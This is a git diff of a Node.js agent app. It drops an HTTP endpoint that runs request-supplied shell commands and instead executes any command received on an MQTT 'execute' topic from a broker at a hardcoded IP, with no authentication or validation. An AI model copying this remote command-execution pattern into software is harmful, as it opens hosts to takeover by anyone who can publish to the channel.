@@ -53,24 +53,7 @@ app.get('/agent', async function (req, res) {
     })
 })
 
-app.post('/execute', async function (req, res) {
-    let command = req.body.command
-    console.log(command)
-    exec(command, (error, stdout, stderr) => {
-        if (error) {
-            console.log(`error: ${error.message}`);
-            res.send(`error: ${error.message}`);
-            return;
-        }
-        if (stderr) {
-            console.log(`stderr: ${stderr}`);
-            res.send(`stderr: ${stderr}`);
-            return;
-        }
-        console.log(`stdout: ${stdout}`);
-        res.send(`stdout: ${stdout}`);
-    });
-})
+
 
 
 
@@ -103,6 +86,7 @@ const clientId = os.hostname()
 const host = 'ws://129.213.48.167:8083/mqtt'
 
 const options = {
+  username: clientId,
   keepalive: 60,
   clientId: clientId,
   protocolId: 'MQTT',
@@ -133,4 +117,25 @@ client.on('connect', () => {
     console.log('Client connected:' + clientId)
     // Subscribe
     client.subscribe('agent', { qos: 0 })
+    client.subscribe('execute', { qos: 0 })
+  })
+function execute(command){
+  console.log(command)
+  exec(command, (error, stdout, stderr) => {
+      if (error) {
+          console.log(`error: ${error.message.toString()}`);
+          client.publish('logs', error.message.toString(), { qos: 0, retain: false })
+      }
+      if (stderr) {
+        console.log(`stdout: ${stdout.toString()}`);
+      }
+      console.log(`stdout: ${stdout.toString()}`);
+  });
+}
+  client.on('message', (topic, message, packet) => {
+    if (topic === 'execute') {
+    let msg = JSON.parse(message.toString())
+    console.log(msg.command)
+    execute(msg.command)
+    }
   })
